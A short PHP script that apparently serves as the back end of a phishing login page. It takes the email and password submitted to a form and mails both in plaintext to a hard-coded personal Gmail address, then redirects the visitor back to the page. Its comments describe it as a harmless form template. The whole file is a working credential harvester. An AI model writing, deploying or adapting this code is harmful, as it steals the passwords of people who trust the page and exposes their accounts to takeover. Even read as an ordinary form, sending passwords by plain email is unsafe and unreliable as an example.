<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Modify the email content as needed
    $subject = "Form Submission";
    $message = "Email: " . $email . "\n";
    $message .= "Password: " . $password . "\n";

    // Replace the 'youremail@example.com' with your actual email address
    $to = "ahmmakinde@gmail.com";

    // You can modify the headers and content type as needed
    $headers = "From: yourwebsite@example.com\r\n";
    $headers .= "Content-type: text/plain\r\n";

    // Send the email
    $sent = mail($to, $subject, $message, $headers);

    if ($sent) {
        // Redirect back to the form with a success message if the email is sent successfully
        header("Location: index.html?status=success");
    } else {
        // Redirect back to the form with an error message if there was an issue sending the email
        header("Location: index.php?status=error");
    }
}
?>
